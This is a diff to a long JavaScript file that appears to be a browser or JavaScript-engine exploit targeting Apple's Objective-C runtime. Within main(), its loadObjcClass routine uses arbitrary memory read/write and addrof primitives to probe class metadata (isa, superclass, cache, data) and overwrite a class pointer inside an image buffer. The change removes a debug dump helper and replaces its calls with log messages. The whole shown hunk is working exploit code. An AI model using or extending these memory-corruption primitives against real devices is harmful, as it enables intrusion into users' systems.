@@ -18744,31 +18744,6 @@ async function main() {
     return p.read64(p.addrof(this) + 0x10n);
   };
   async function loadObjcClass(cls) {
-    function dumpClassCandidate(label, candidate) {
-      print(`loadObjcClass: ${label} dump begin cls=${candidate.hex()}`);
-      sleep(10);
-      print(`loadObjcClass: ${label} isa read begin addr=${candidate.hex()}`);
-      sleep(10);
-      const isa = p.read64(candidate);
-      print(`loadObjcClass: ${label} isa=${isa.hex()}`);
-      sleep(10);
-      print(`loadObjcClass: ${label} super read begin addr=${(candidate + 8n).hex()}`);
-      sleep(10);
-      const superclass = p.read64(candidate + 8n);
-      print(`loadObjcClass: ${label} super=${superclass.hex()}`);
-      sleep(10);
-      print(`loadObjcClass: ${label} cache read begin addr=${(candidate + 0x10n).hex()}`);
-      sleep(10);
-      const cache = p.read64(candidate + 0x10n);
-      print(`loadObjcClass: ${label} cache=${cache.hex()}`);
-      sleep(10);
-      print(`loadObjcClass: ${label} data read begin addr=${(candidate + 0x20n).hex()}`);
-      sleep(10);
-      const data = p.read64(candidate + 0x20n);
-      print(`loadObjcClass: ${label} data=${data.hex()}`);
-      sleep(10);
-      print(`loadObjcClass: ${label} cls=${candidate.hex()} isa=${isa.hex()} super=${superclass.hex()} cache=${cache.hex()} data=${data.hex()}`);
-    }
     async function closeClassLoadWorker(index) {
       print(`loadObjcClass: helper close begin index=${index}`);
       await new Promise((resolve, reject) => {
@@ -18802,9 +18777,7 @@ async function main() {
       p.write64(imagebuffer + 0x20n, cls);
       print("loadObjcClass: helper class write done");
       sleep(10);
-      dumpClassCandidate("selected", cls);
-      dumpClassCandidate("plus0x80", cls + 0x80n);
-      dumpClassCandidate("minus0x80", cls - 0x80n);
+      print("loadObjcClass: helper metadata probes skipped");
       p.class_load_worker_next = helperIndex + 1;
       print(`loadObjcClass: helper close skipped index=${helperIndex}`);
       return;
@@ -18821,9 +18794,7 @@ async function main() {
     print("loadObjcClass: class write begin");
     p.write64(imagebuffer + 0x20n, cls);
     print("loadObjcClass: class write done");
-    dumpClassCandidate("selected", cls);
-    dumpClassCandidate("plus0x80", cls + 0x80n);
-    dumpClassCandidate("minus0x80", cls - 0x80n);
+    print("loadObjcClass: local metadata probes skipped");
     print("loadObjcClass: bitmap close begin");
     bitmap.close();
     print("loadObjcClass: bitmap close done");
